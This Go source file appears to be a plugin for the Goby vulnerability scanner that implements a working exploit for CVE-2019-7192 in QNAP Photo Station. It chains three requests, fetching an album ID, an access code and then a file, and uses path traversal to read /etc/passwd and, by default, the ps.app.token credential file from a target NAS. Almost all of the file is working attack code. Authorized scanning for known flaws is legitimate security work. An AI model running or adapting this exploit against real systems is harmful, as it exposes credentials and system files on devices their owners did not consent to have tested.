package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "QNAP Photo Station APP Local File Read (CVE-2019-7192)",
    "Description": "This improper access control vulnerability allows remote attackers to gain unauthorized access to the system. To fix these vulnerabilities, QNAP recommend updating Photo Station to their latest versions.",
    "Product": "QNAP",
    "Homepage": "https://www.qnap.com/en/app_releasenotes/list.php?app_choose=PhotoStation",
    "DisclosureDate": "2019-12-05",
    "Author": "ovi3",
    "FofaQuery": "app=\"QNAP-NAS\"",
    "Level": "3",
    "Impact": "This improper access control vulnerability allows remote attackers to gain unauthorized access to the system",
    "Recommendation": "updating QTS and Photo Station to their latest versions.",
    "References": null,
    "RealReferences": [
        "http://packetstormsecurity.com/files/157857/QNAP-QTS-And-Photo-Station-6.0.3-Remote-Command-Execution.html",
        "https://www.qnap.com/zh-tw/security-advisory/nas-201911-25",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-7192",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7192"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "./../../../../../share/Multimedia/.@__thumb/ps.app.token"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": null,
    "CVEIDs": [
        "CVE-2019-7192"
    ],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "QNAP-NAS"
        ]
    },
    "Disable": false,
    "PocId": "10194"
}`

	readFile := func(u *httpclient.FixUrl, filePath string) string {
		// get album id
		cfg := httpclient.NewPostRequestConfig("/photo/p/api/album.php")
		cfg.VerifyTls = false
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = `a=setSlideshow&f=qsamplealbum`
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err != nil || resp.StatusCode != 200 {
			return ""
		}
		m := regexp.MustCompile(`<output>(.*?)</output>`).FindStringSubmatch(resp.RawBody)
		if m == nil {
			return ""
		}
		albumId := m[1]
		cookie := resp.Cookie

		// get access token
		cfg2 := httpclient.NewGetRequestConfig("/photo/slideshow.php?album=" + albumId)
		cfg2.VerifyTls = false
		cfg2.Header.Store("Cookie", cookie)
		resp2, err := httpclient.DoHttpRequest(u, cfg2)
		if err != nil || resp2.StatusCode != 200 {
			return ""
		}
		m = regexp.MustCompile(`encodeURIComponent\('(.*?)'\)`).FindStringSubmatch(resp2.RawBody)
		if m == nil {
			return ""
		}
		accessCode := m[1]
		cookie += resp2.Cookie

		// get file
		cfg3 := httpclient.NewPostRequestConfig("/photo/p/api/video.php")
		cfg3.VerifyTls = false
		cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg3.Header.Store("Cookie", cookie)
		cfg3.Data = fmt.Sprintf(`album=%s&a=caption&ac=%s&f=UMGObv&filename=%s`, albumId, accessCode, url.QueryEscape(filePath))
		resp3, err := httpclient.DoHttpRequest(u, cfg3)
		if err != nil || resp3.StatusCode != 200 {
			return ""
		}
		return resp3.RawBody

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			content := readFile(u, "./../../../../../etc/passwd")
			if strings.Contains(content, "admin:x:0:0") {
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			content := readFile(expResult.HostInfo, filePath)
			if len(content) > 0 {
				expResult.Success = true
				expResult.Output = content
			}
			return expResult
		},
	))
}
